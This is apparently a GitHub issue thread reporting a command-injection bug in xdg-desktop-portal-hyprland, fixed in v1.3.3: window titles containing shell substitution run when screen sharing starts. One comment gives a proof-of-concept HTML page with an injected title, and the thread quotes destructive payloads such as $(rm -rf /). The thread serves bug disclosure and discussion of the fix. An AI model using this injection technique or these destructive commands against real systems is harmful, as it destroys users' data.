| TL;DR: Update xdg-desktop-portal-hyprland to V1.3.3 and you'll be safe.  [@vaxerski](https://github.com/vaxerski) Sorry for the ping, but I feel this is urgent.  I have reason to believe that xdg-desktop-portal-hyprland or something running through it was the program that deleted almost ALL of the files in my home directory, this boils down to any non-hidden file (except for the go folder for permission issues, this becomes relevant).  I don't have logs for hyprland, or anything else that logs need be manually enabled for, but I do have the system journal logs, and it shows like mentioned, that `rm` could not delete a certain directory under ~/go/ because it did not have the permission to do so. You can find the journal log here: <http://0x0.st/XpmT.log>  I have a backup of my partition, and a file copy of the root as well, so if you need any sort of log I should be able to provide it, given it exists on my disk.  Let me know if you need anything, if you would like to talk in private you can email me at wes@wesbryie.com |

| Aw no, When was this bug introduced? I have too little disk space to update NixOS to 24.05 to get the latest packages and I have no way to back it up right now. I'm still on v1.2.4! |

| basically if you have some form of bash command substitution (e.g. `$(rm -rf /)`) in a window title & you try to share your screen, that command is going to get executed due to how the window list is passed to hyprland-share-picker (like `XDPH_WINDOW_SHARING_LIST="legit window title 1\nmalicious title $(command)\nlegit window title 2\n" hyprland-share-picker`)  made a basic (bad) proof of concept at <https://errornointernet.dynv6.net:1010/xdph-rce/>  ``` <head>     <title>$(notify-send 'rm -rf --no-preserve-root /')</title> </head> <body>     <p>look at tab title</p>      <video id="local-video" muted autoplay></video>     <button onclick="captureScreen()">trigger screen share</button>     <script>         async function captureScreen() {         let mediaStream = null;         try {             mediaStream = await navigator.mediaDevices.getDisplayMedia({                 video: {                     cursor: "always"                 },                 audio: false             });                  document.getElementById("local-video").srcObject = mediaStream;         } catch (ex) {             console.log("error occurred", ex);         }     }     </script> </body>  ```  you should get a notification and a hyprland-share-picker window  shouldn't be affected if on xdph 1.3.3 or later |

The only command that actually was able to run (from all, that I did run) was `systemctl poweroff` which actually did power off my machine. |

| How does one even get "$(rm -rf ~)" inside their window title, unless doing it on purpose of course  In my case at least, I tend to have a kitty window open, which explains the ~, but I still am unsure as to why it was deleting something. As far as I know, I have no way to truly know what happened. |

| I don't know C++, so forgive me if the question is stupid.  But why are those commands composed as a string in a first place?   * In go you can [create environment](https://go.dev/play/p/klBjeBKDbvM) for a command you want to execute. * In python too - `subprocess.Popen([command, arg1, arg2, arg3], env=my_env_dict)`.   The process is executed directly without a shell in both cases (by default).  Is there no such thing for C++?  Running a command as a string interpreted by shell, without a need for said shell, seems like asking for trouble. |

| It's a hack yes - it's just how I wrote it. See the comment I attached to it. It does suck a bit, but it works.  The process is executed directly without a shell in both cases (by default).  Yes, of course there is, `execl` exists. The problem is it's a bit more code, and thus I opted for a util I wrote anyways for spawning a shell.  As Brodie Robertson said, I "write way too much code". Sometimes such oopsies will slip by, given I don't have 30 other highly skilled devs to review my code like e.g. KDE, and that I just want to get stuff done.  I do think about security issues, but sometimes you just forget about something. |

| It's no longer possible, it was at a level of a typo, pretty much, let's be real.  Gnome had an RCE a few months ago too. |
